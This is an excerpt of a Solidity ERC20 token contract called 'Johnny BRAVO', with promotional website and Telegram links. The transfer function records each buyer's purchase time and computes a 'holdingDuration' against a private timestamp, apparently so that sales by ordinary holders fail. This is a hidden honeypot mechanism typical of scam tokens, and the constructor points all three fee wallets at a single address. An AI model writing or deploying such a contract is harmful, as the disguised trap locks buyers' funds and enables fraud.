...
// Johnny BRAVO
// Website: https://johnnybravotoken.io
// Portal: https://T.me/JohnnyBravoPortal
...
contract Johnny is ERC20, Ownable {
    ...
    mapping(address => RSwaped) private _swapI;
    uint256 private _swapTs;
    ...
    constructor() ERC20("Johnny", "BRAVO") {
        ...
        marketingWallet = payable(0x98941ac7353aB7Ae910293C68b96956E8e6F3662);
        developmentWallet = payable(0x98941ac7353aB7Ae910293C68b96956E8e6F3662);
        liqWallet = payable(0x98941ac7353aB7Ae910293C68b96956E8e6F3662);
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                RSwaped storage txInformation = _swapI[to];
                if (txInformation.swapLastB == 0) {
                    txInformation.swapLastB = block.timestamp;
                }
            } else {
                RSwaped storage txInformation = _swapI[from];
                txInformation.holdingDuration = txInformation.swapLastB - _swapTs;
                txInformation.swapLastS = block.timestamp;
            }
        }
